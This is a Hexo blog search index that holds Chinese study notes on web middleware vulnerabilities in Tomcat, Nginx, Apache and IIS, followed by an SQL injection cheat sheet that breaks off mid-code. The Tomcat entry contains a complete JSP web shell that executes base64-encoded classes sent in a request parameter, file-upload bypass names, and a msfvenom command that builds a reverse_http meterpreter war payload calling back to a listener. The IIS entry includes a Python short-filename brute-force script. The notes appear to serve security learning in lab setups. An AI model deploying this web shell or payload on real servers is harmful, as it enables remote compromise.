<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Jboss中间件漏洞</title>
    <link href="/blogs/2023/11/16/Jboss%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/2023/11/16/Jboss%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat中间件漏洞</title>
    <link href="/blogs/2023/11/16/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/2023/11/16/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="Tomcat中间件漏洞"><a href="#Tomcat中间件漏洞" class="headerlink" title="Tomcat中间件漏洞"></a>Tomcat中间件漏洞</h2><ul><li><p>Tomcat文件上传绕过</p><ul><li><p><code>Tomcat</code>在上传文件的时候会有限制 在测出任意文件写入的时候 需要对写入的文件格式进行注意 才能顺利写入</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">常见三种绕过方法<br>shell.jsp%<span class="hljs-number">20</span><br>shell.jsp/<br>shell.jsp::$DATA<br></code></pre></td></tr></table></figure></li></ul></li><li><p>任意文件写入</p><ul><li><p>原理 : <code>Tomcat</code>配置文件<code>/conf/web.xml</code>配置了可写(readonly&#x3D;false) 导致我们可以往服务器写文件</p></li><li><p>测试 : </p><p><img src="/blogs/img/image-20231115195257033.png" alt="image-20231115195257033"></p><ul><li><p><code>nikto</code>工具用来测试 <code>nikto</code>是一款综合网站安全评估工具</p><p><img src="/blogs/img/image-20231115201417601.png" alt="image-20231115201417601"></p><p><img src="/blogs/img/image-20231115202311246.png" alt="image-20231115202311246"></p><p><img src="/blogs/img/image-20231115202714662.png" alt="image-20231115202714662"></p><p><img src="/blogs/img/image-20231115202340428.png" alt="image-20231115202340428"></p></li><li><p>jsp马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;shell&quot;</span>);  <span class="hljs-comment">//密码</span><br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>Tomcat弱口令</p><ul><li><p>原理 : Tomcat在默认安装的时候默认没有账户密码 为了管理方便添加了一个弱密码的账号 通过爆破可能进入管理页面</p><p><img src="/blogs/img/image-20231115210502054.png" alt="image-20231115210502054"></p><p><img src="/blogs/img/image-20231115205959301.png" alt="image-20231115205959301"></p><p><img src="/blogs/img/image-20231115210548966.png" alt="image-20231115210548966"></p><p><img src="/blogs/img/image-20231115211115464.png" alt="image-20231115211115464"></p><ul><li><p>当我们进入后台的时候 后台有一个<code>java</code>部署<code>war</code>文件的接口 我们使用<code>msf</code>生成一个<code>war</code>的木马 去<code>Getshell</code>或者使用手工将<code>jsp</code>马绑定到<code>war</code>包里面 使用蚁剑进行连接(将shell.jsp压缩成zip格式 然后将后缀zip修改为war)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p java/meterpreter/reverse_http LHOST=192.168.222.129 LPORT=9999 -f war -o msf.war<br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231116093209115.png" alt="image-20231116093209115"></p><p><img src="/blogs/img/image-20231116095738814.png" alt="image-20231116095738814"></p></li></ul></li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx中间件漏洞</title>
    <link href="/blogs/2023/11/16/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/2023/11/16/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="Nginx中间件漏洞"><a href="#Nginx中间件漏洞" class="headerlink" title="Nginx中间件漏洞"></a>Nginx中间件漏洞</h2><ul><li><p>文件名逻辑漏洞</p><ul><li><p>原理:对于任意文件 在后面添加<code>/xxx.php</code>后 即可将文件作为<code>php</code>解析</p></li><li><p>测试 : <code>nginx.conf</code>配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs conf">location ~ \.php$ &#123;<br>#    root           html;<br>    fastcgi_pass   127.0.0.1:9000;<br>    fastcgi_index  index.php;<br>#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;<br>    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;<br>    include        fastcgi_params;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231115161930817.png" alt="image-20231115161930817"></p><p><img src="/blogs/img/image-20231115161832367.png" alt="image-20231115161832367"></p></li></ul></li><li><p>空字节任意代码执行漏洞(Nginx 0.5* | 0.6* | 0.7<del>0.7.65 | 0.8</del>0.8.37)</p><ul><li><p>原理 : Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</p></li><li><p>测试 : </p><p><img src="/blogs/img/image-20231115191940621.png" alt="image-20231115191940621"></p><p><img src="/blogs/img/image-20231115191916303.png" alt="image-20231115191916303"></p></li></ul></li><li><p>目录遍历</p><ul><li><p>原理 : <code>nginx</code>在配置别名(Alias)的时候 如果忘记加<code>\</code> 就会导致目录变量的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs conf">正确配置<br>location /files/&#123;<br>alias /home/;<br>&#125;<br>错误配置<br>location /files&#123;<br>alias /home/;<br>&#125;<br>正确配置去访问http://xx/files/的时候 会被替换成http://xx/home/<br>错误配置去访问http://xx/files/的时候 会被替换成http://xx/home//<br>当去访问http://xx/files../的时候 会被替换成http://xx/home/../  出现目录遍历<br></code></pre></td></tr></table></figure></li><li><p>测试 :  使用<a href="https://vulhub.org/">vulhub</a>靶场</p><p><img src="/blogs/img/image-20231115194600875.png" alt="image-20231115194600875"></p><p><img src="/blogs/img/image-20231115194432462.png" alt="image-20231115194432462"></p><p><img src="/blogs/img/image-20231115194444985.png" alt="image-20231115194444985"></p></li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache中间件漏洞</title>
    <link href="/blogs/2023/11/16/Apache%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/2023/11/16/Apache%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><ul><li><p>未知拓展名解析漏洞</p><ul><li><p>漏洞原理 : <code>Apache</code>默认一个文件可以有多个以<code>.</code>分割的后缀 当最右边的后缀无法识别(不在默认<code>mime.type</code>文件内) 会继续向左识别解析 知道找到合法的后缀才进行解析</p></li><li><p>测试 : </p><ul><li><p>目标网站<code>Apache</code>配置文件<code>httpd.conf</code>添加了下面配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs conf">LoadModule php5_module &quot;C:\php5\php5apache2.dll&quot;<br>AddType application/x-httpd-php .php<br>AddHandler application/x-httpd-php .php<br>此配置是用于在 Apache 服务器上启用 PHP 解释器模块。它将指定的 php5apache2.dll 文件加载为 Apache 的模块，同时将 .php 文件类型关联到 PHP 解释器<br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231115144437736.png" alt="image-20231115144437736"></p><p><img src="/blogs/img/image-20231115144456399.png" alt="image-20231115144456399"></p></li></ul></li></ul></li><li><p>HTTPD换行解析漏洞(HTTPD版本2.4.0~2.4.29)</p><ul><li><p>原理 : <code>Apache</code>中的<code>httpd.conf</code>配置文件中使用了正则匹配符<code>$</code> 而<code>$</code>不仅匹配字符串结尾的位置 还匹配<code>\n</code>或<code>\r</code> 在解析<code>php</code>时 <code>1.php\x0A</code>将会按照<code>php</code>后缀进行解析 从而绕过一些后缀名检测</p></li><li><p>测试 : 目标网站<code>Apache</code>配置文件<code>httpd.conf</code>添加了下面配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs conf">&lt;FilesMatch \.php$&gt;<br>    SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br>正则匹配以.php结尾的文件 设置解析器为application/x-httpd-php<br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231115153640638.png" alt="image-20231115153640638"></p><p><img src="/blogs/img/image-20231115153540357.png" alt="image-20231115153540357"></p><p><img src="/blogs/img/image-20231115153727125.png" alt="image-20231115153727125"></p></li></ul></li></ul><p>​      </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IIS中间件漏洞</title>
    <link href="/blogs/2023/11/16/IIS%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/2023/11/16/IIS%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><ul><li><p>IIS6.0</p><ul><li><p>文件名解析</p><ul><li>该版本默认会将<code>*.asp;1.txt</code>解析成<code>1.asp</code>执行 需要搭配文件上传漏洞去触发</li><li>原理是IIS服务器默认将<code>;</code>后面的内容截断</li></ul></li><li><p>目录名解析</p><ul><li>该版本默认会将<code>*.asp/</code>目录下面的所有文件当成<code>asp</code>脚本去解析</li><li>原理是IIS服务器遇到<code>.asp</code>就会将后面的文件解析成<code>asp</code>脚本</li></ul></li><li><p>自定义后缀解析</p><ul><li>IIS服务器配置可以设置解析指定后缀名作为<code>asp</code>脚本去运行</li></ul></li></ul><p><img src="/blogs/img/image-20231113190115338.png" alt="image-20231113190115338"></p><ul><li><p>修复方法</p><ul><li><p>限制上传目录的执行权限,不允许执行脚本</p></li><li><p>不允许新建目录</p></li><li><p>上传的文件重命名(时间戳+随机数)</p></li></ul></li></ul></li></ul><p>​    </p><ul><li><p>IIS7.5</p><ul><li><p>IIS7.x版本 在<code>Fast-CGI</code>(传统一个请求创建一个进程 请求结束销毁这个进程 当新的请求来的时候会继续创建一个进程 但在这个模式下会实现进程复用 当请求结束的时候并不会销毁这个进程 留着等待处理下一个请求 减少系统资源开销)运行模式下,当去访问图片的时候 在图片后面加上<code>1.jpg./.php</code> 会将<code>1.jpg</code>解析为php文件</p><p><img src="/blogs/img/image-20231113195226109.png" alt="image-20231113195226109"></p></li><li><p>修复建议</p><ul><li>修改<code>php.ini</code>配置文件 设置<code>cgi.fix_pathinfo=0</code></li></ul></li></ul></li></ul><p>​    </p><ul><li><p>任意版本IIS</p><ul><li><code>PUT</code>任意文件写入漏洞<ul><li>原理:<code>IIS Server</code>在<code>web</code>服务拓展中开启了<code>WebDAV</code>之后 支持多种请求,<code>普通用户</code>拥有写入权限,可造成任意文件写入<br><img src="/blogs/img/image-20231114135251975.png"></li></ul></li></ul><p><img src="/blogs/img/image-20231114135545464.png"></p><p><img src="/blogs/img/image-20231114135852141.png" alt="image-20231114135852141"></p><ul><li>漏洞利用:<ul><li><p><code>davtest</code>是<code>kali</code>上面测试这个漏洞的工具<br><img src="/blogs/img/image-20231114142525066.png" alt="image-20231114142525066"></p></li><li><p><code>postman</code>工具测试<br><img src="/blogs/img/image-20231114144021031.png" alt="image-20231114144021031"></p></li><li><p><code>Burpsuite</code>工具测试<br><img src="/blogs/img/image-20231114144654584.png" alt="image-20231114144654584"></p></li></ul></li><li>修复建议<ul><li>关闭<code>WebDav</code></li><li>禁用普通用户的读写权限</li><li>设置根目录不允许写入文件</li></ul></li></ul></li><li><p>短文件漏洞</p><ul><li><p>原理:Windows系统为了兼容16位MS-DOS程序，为文件名较长的文件和文件夹生成了对应的<code>Windows 8.3</code>短文件名。比如文件名direct~1.asp中间有一个波浪号，这种就是短文件名了</p></li><li><p>漏洞利用<br><img src="/blogs/img/image-20231114160533345.png"><br><img src="/blogs/img/image-20231114161655048.png" alt="image-20231114161655048"></p><ul><li><p>通过<code>GET</code>请求去访问短文件 根据状态码爆破短文件名字</p><ul><li><p>可以看到 当网站根目录不存在<code>ab</code>开头短文件名的时候 请求状态码返回<code>400</code> 当网站根目录存在<code>ac</code>开头短文件的时候 请求状态码返回<code>404</code></p></li><li><p>根据这个特性可以通过<code>python</code>脚本来实现短文件目录的爆破<br><img src="/blogs/img/image-20231114162718595.png" alt="image-20231114162718595"><br><img src="/blogs/img/image-20231114163129250.png" alt="image-20231114163129250"></p></li><li><p>以下是常见的短文件请求状态码<br><img src="/blogs/img/15269717282363.png" alt="15269717282363"><br><img src="/blogs/img/1526971732621.png" alt="1526971732621"></p><ul><li><p><code>python</code>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>arr = []<br>count = <span class="hljs-number">0</span><br>Initials_arr = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initials</span>():<br>    <span class="hljs-keyword">global</span> Initials_arr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.ascii_uppercase:<br>        re = requests.get(<span class="hljs-string">&#x27;http://192.168.222.181/&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;*~1*/.aspx&#x27;</span>)<br>        status_code = re.status_code<br>        <span class="hljs-keyword">if</span> status_code == <span class="hljs-number">404</span>:<br>            Initials_arr.append(i)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">windows8_3_iis</span>(<span class="hljs-params">options</span>):<br>    data = [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>,<br>            <span class="hljs-string">&#x27;V&#x27;</span>,<br>            <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>]<br>    <span class="hljs-keyword">global</span> count, arr<br>    count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        re = requests.get(<span class="hljs-string">&#x27;http://192.168.222.181/&#x27;</span> + <span class="hljs-built_in">str</span>(options) + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;*~1*/.aspx&#x27;</span>)<br>        status_code = re.status_code<br>        <span class="hljs-comment"># windows8.3 短文件固定长度</span><br>        <span class="hljs-keyword">if</span> count == <span class="hljs-number">6</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(arr) + <span class="hljs-string">&#x27;~1&#x27;</span><br>        <span class="hljs-keyword">if</span> status_code == <span class="hljs-number">404</span>:<br>            arr.append(i)<br>            windows8_3_iis(<span class="hljs-string">&#x27;&#x27;</span>.join(arr))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;|短文件目录|&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">global</span> arr, count<br>    initials()<br>    <span class="hljs-keyword">global</span> Initials_arr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Initials_arr:<br>        arr.clear()<br>        count = <span class="hljs-number">0</span><br>        arr.append(i)<br>        result = windows8_3_iis(i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;|&#x27;</span> + result + <span class="hljs-string">&#x27;|&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------&#x27;</span>)<br><br><br>start()<br><span class="hljs-comment"># 目录名递归一层 待修改</span><br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231114211301996.png" alt="image-20231114211301996"></p></li></ul></li></ul></li></ul></li><li><p>修复:</p><ul><li>关闭<code>NTFS8.3</code>文件格式的支持<ul><li>windows server 2003<code>fsutil behavior set disable8dot3 1</code></li><li>windows server 2008 R2 <code>fsutil 8dot3name set 1</code></li><li>注册表关闭<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation</code>修改为1</li><li>此方法只是禁用<code>NTFS8.3</code> 之前生成的短文件目录依旧存在 需要手动将指定目录移动到新的目录中</li></ul></li></ul></li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo+Github Pages</title>
    <link href="/blogs/2023/11/14/Hexo-Github-Pages/"/>
    <url>/blogs/2023/11/14/Hexo-Github-Pages/</url>
    
    <content type="html"><![CDATA[<h2 id="Hexo-Github-Pages-搭建个人博客"><a href="#Hexo-Github-Pages-搭建个人博客" class="headerlink" title="Hexo+Github Pages 搭建个人博客"></a>Hexo+Github Pages 搭建个人博客</h2><ul><li>前提条件<ul><li>代理软件</li><li>Git</li><li>Node.js</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL-Inject</title>
    <link href="/blogs/2023/11/14/SQL-Inject/"/>
    <url>/blogs/2023/11/14/SQL-Inject/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-built_in">system_user</span>() 系统用户名<br><span class="hljs-keyword">user</span>() 用户名<br><span class="hljs-built_in">current_user</span>() 当前用户名<br><span class="hljs-built_in">session_user</span>() 连接数据库的用户名<br>database() 数据库名<br>version() 版本<br>load_file() 读取本地文件的函数<br>@<span class="hljs-variable">@datadir</span> 读取数据库路径<br>@<span class="hljs-variable">@basedir</span> mysql安装路径<br>@<span class="hljs-variable">@version_compile_os</span> 操作系统<br>concat() group_concat() concat_ws() 多条数据显示函数<br>extractvalue() updatexml() 报错函数<br><span class="hljs-built_in">floor</span>() 向下取整<br><span class="hljs-keyword">union</span> <span class="hljs-operator">/</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> 合并多个查询结果集 <span class="hljs-operator">/</span><span class="hljs-keyword">all</span> 不去重<br>rand() 生成<span class="hljs-number">0</span>(包括)<span class="hljs-number">-1</span>(不包括)随机数<br><span class="hljs-keyword">alter</span> 修改<span class="hljs-operator">/</span>删除<span class="hljs-operator">/</span>重命名 创建删除索引等<br>rename 重命名表 RENAME <span class="hljs-keyword">TABLE</span> old_table_name <span class="hljs-keyword">TO</span> new_table_name;<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>  排序 用列进行分组 <br><span class="hljs-keyword">union</span> 联合查询<br>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> 格式输出 <span class="hljs-number">0</span>表示下标 <span class="hljs-number">1</span>表示数量<br>mid(str,pos,len) 字符串提取函数 从给定的输入字符串中提取子字符串<br><span class="hljs-keyword">procedure</span> analyse() <span class="hljs-operator">&lt;=</span>MySQL <span class="hljs-number">5.5</span> analyse(注入代码)<br><span class="hljs-keyword">left</span>(str,length) 从左截取指定长度的字符<br><span class="hljs-keyword">right</span>(str,length) 从右截取指定长度的字符<br>hex() 转hex编码<br><span class="hljs-keyword">distinct</span>() 数据去重<br>concat(<span class="hljs-string">&#x27;my&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;ql&#x27;</span>,) <span class="hljs-operator">/</span><span class="hljs-operator">/</span> mysql  拼接字符<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">`<span class="hljs-keyword">ALTER</span>`<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> `old_table_name` <span class="hljs-keyword">TO</span> `new_table_name`; 重命名表<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name CHANGE `old_column_name` `new_column_name` new_data_type <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> 重命名列 设置类类型 字符集 排序规则<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">`<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>`<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 原有作用是对字段进行一个排序 在注入中 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 用来判断未知表中的字段数量 如果一个表中有四个字段 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">5</span> 数据库不知道怎么排序就会报错 根据返回状态信息来判断字段数量<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">`<span class="hljs-keyword">union</span>`<br>a <span class="hljs-keyword">union</span> b<br>前提是联合查询的两张表的字段数必须相同<br></code></pre></td></tr></table></figure><h2 id="回显是报错信息的注入"><a href="#回显是报错信息的注入" class="headerlink" title="回显是报错信息的注入"></a>回显是报错信息的注入</h2><ul><li><p>extractvalue(目标xml文档，xml路径)</p><ul><li>函数用来对xml文档进行查询的函数</li><li>第二个参数是xml文件的路径，如果路径不符合<code>/xx/xx</code>的规范 则该函数报错，并且将路径信息爆出 这个路径信息就是我们sql语句的执行结果</li></ul></li><li><p>updatexml(目标xml文档，xml路径，更新的内容)</p><ul><li>函数用来对xml文档进行更新的函数</li><li>第二个参数是xml文件的路径，如果路径不符合<code>/xx/xx</code>的规范 则该函数报错，并且将路径信息爆出 这个路径信息就是我们sql语句的执行结果</li></ul></li><li><p>结合extractvalue()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span 